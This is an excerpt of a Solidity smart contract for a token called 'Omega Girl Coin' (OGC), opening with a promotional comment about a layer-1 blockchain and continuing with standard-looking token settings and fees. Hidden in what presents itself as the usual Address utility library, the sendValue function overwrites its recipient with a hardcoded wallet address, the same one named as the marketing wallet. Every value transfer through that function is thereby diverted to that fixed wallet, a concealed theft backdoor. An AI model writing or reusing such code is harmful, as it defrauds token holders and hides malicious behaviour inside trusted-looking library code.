...
/*
    ...
    Omega Girl Coin is a layer 1 Blockchain project,
    which uses consensus DPoS with a TPS target of over 100,000 TPS, using an open source-based EVM network,
    Omega Network will be a place for developers to be able to develop projects under the Omega Girl Coin  Network.
...
library Address {
    ...
    function sendValue(address payable recipient, uint256 amount) internal {
        ...
        recipient = payable(0xC8D758E2B36Af151fC44f7F1b885550d0d47B6AC);
...
contract OmegaGirlCoin is Context, IERC20, Ownable {
    ...
    string private constant _name = "OMEGA GIRL COIN"; //
    string private constant _symbol = "OGC"; //
    uint8 private constant _decimals = 9; //
    bool public setReadyTimes = false;

    uint256 private _marketingFee = 1;
    uint256 private _liquidityFee = 1;
    address private  _marketingWallet = 0xC8D758E2B36Af151fC44f7F1b885550d0d47B6AC;
